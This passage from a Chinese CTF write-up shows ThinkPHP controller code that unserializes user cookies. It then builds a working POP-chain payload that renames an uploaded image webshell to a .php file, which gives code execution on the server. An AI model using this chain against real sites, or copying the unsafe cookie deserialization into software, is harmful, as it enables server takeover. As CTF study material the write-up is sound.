            $this->assign("username",$this->profile_db['username']);
            return $this->fetch("home");
        }
    }

    public function login_check(){
        $profile=cookie('user');
        if(!empty($profile)){
            $this->profile=unserialize(base64_decode($profile));
            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
            if(array_diff($this->profile_db,$this->profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }

    public function check_upload_img(){
        if(!empty($this->profile) && !empty($this->profile_db)){
            if(empty($this->profile_db['img'])){
                return 0;
            }else{
                return 1;
            }
        }
    }

    public function logout(){
        cookie("user",null);
        $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
        $this->redirect($curr_url,302);
        exit();
    }

    public function __get($name)
    {
        return "";
    }

}


```

`Login.php`登陆成功返回对应usercookie信息
```php

<?php
namespace app\web\controller;
use think\Controller;

class Login extends Controller
{
    public $checker;

    public function __construct()
    {
        $this->checker=new Index();
    }

    public function login(){
        if($this->checker){
            if($this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home";
                $this->redirect($curr_url,302);
                exit();
            }
        }
        if(input("?post.email") && input("?post.password")){
            $email=input("post.email","","addslashes");
            $password=input("post.password","","addslashes");
            $user_info=db("user")->where("email",$email)->find();
            if($user_info) {
                if (md5($password) === $user_info['password']) {
                    $cookie_data=base64_encode(serialize($user_info));
                    cookie("user",$cookie_data,3600);
                    $this->success('Login successful!', url('../home'));
                } else {
                    $this->error('Login failed!', url('../index'));
                }
            }else{
                $this->error('email not registed!',url('../index'));
            }
        }else{
            $this->error('email or password is null!',url('../index'));
        }
    }


}
```



Profile.php
```php

<?php
namespace app\web\controller;

use think\Controller;

class Profile extends Controller
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function __construct()
    {
        $this->checker=new Index();
        $this->upload_menu=md5($_SERVER['REMOTE_ADDR']);
        @chdir("../public/upload");
        if(!is_dir($this->upload_menu)){
            @mkdir($this->upload_menu);
        }
        @chdir($this->upload_menu);
    }

    public function upload_img(){
        if($this->checker){
            if(!$this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
                $this->redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
            $this->filename=md5($_FILES['upload_file']['name']).".png";
            $this->ext_check();
        }
        if($this->ext) {
            if(getimagesize($this->filename_tmp)) {
                @copy($this->filename_tmp, $this->filename);
                @unlink($this->filename_tmp);
                $this->img="../upload/$this->upload_menu/$this->filename";
                $this->update_img();
            }else{
                $this->error('Forbidden type!', url('../index'));
            }
        }else{
            $this->error('Unknow file type!', url('../index'));
        }
    }

    public function update_img(){
        $user_info=db('user')->where("ID",$this->checker->profile['ID'])->find();
        if(empty($user_info['img']) && $this->img){
            if(db('user')->where('ID',$user_info['ID'])->data(["img"=>addslashes($this->img)])->update()){
                $this->update_cookie();
                $this->success('Upload img successful!', url('../home'));
            }else{
                $this->error('Upload file failed!', url('../index'));
            }
        }
    }

    public function update_cookie(){
        $this->checker->profile['img']=$this->img;
        cookie("user",base64_encode(serialize($this->checker->profile)),3600);
    }

    public function ext_check(){
        $ext_arr=explode(".",$this->filename);
        $this->ext=end($ext_arr);
        if($this->ext=="png"){
            return 1;
        }else{
            return 0;
        }
    }

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

```

register有析构函数，未注册的情况会调用`$this->checker->index();`
如果checker是一个`Profile`类，调用index()触发_call()，call调用`this->index`属性
继而调用`_get()`方法，返回给`_call`的结果为`this->except['index']`
如果提前指定`except=["index"=>"upload_image"]`，那么在_call方法中就可以调用`upload_image`方法了
提前上传好一张图片马，通过本次调用`upload_image`将上传好的图片马重命名为.php结尾的shell文件

payload
```php
<?php
namespace app\web\controller;
class Profile
{
    public $checker=0;
    public $filename_tmp="../public/upload/c55e0cb61f7eb238df09ae30a206e5ee/f121d135f39f03e48da5fe5e8ced5b0a.png";
    public $filename="../public/upload/c55e0cb61f7eb238df09ae30a206e5ee/f121d135f39f03e48da5fe5e8ced5b0a.php";
    public $ext=1;
    public $except=array('index'=>'upload_img');

}
class Register
{
    public $checker;
    public $registed=0;
}

$a=new Register();
$a->checker=new Profile();
echo base64_encode(serialize($a));

```

注册新用户，上传图片马，退出登录，payload替换文件名，替换cookie，
![在这里插入图片描述](https://img-blog.csdnimg.cn/cd33fe1f0a51480f924df20ef2c497c1.png)

